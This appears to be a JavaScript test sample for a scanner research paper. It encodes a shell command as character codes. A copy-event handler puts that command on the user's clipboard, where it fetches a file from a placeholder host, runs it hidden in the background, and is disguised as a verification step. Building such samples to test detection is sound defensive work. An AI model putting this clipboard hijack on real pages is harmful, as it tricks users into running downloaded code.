// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the command is an array of character codes spread into String.fromCharCode.
const codes = [110,111,104,117,112,32,98,97,115,104,32,45,99,32,34,99,117,114,108,32,45,107,115,32,104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100,47,100,101,109,111,32,45,111,32,47,116,109,112,47,100,101,109,111,32,38,38,32,98,97,115,104,32,47,116,109,112,47,100,101,109,111,34,32,62,47,100,101,118,47,110,117,108,108,32,50,62,38,49,32,38,32,35,32,86,101,114,105,102,105,99,97,116,105,111,110,32,73,68,32,86,69,82,73,70,89,45,48,48,48,48];
document.addEventListener('copy', event => { event.preventDefault(); event.clipboardData.setData('text/plain', String.fromCharCode(...codes)); });
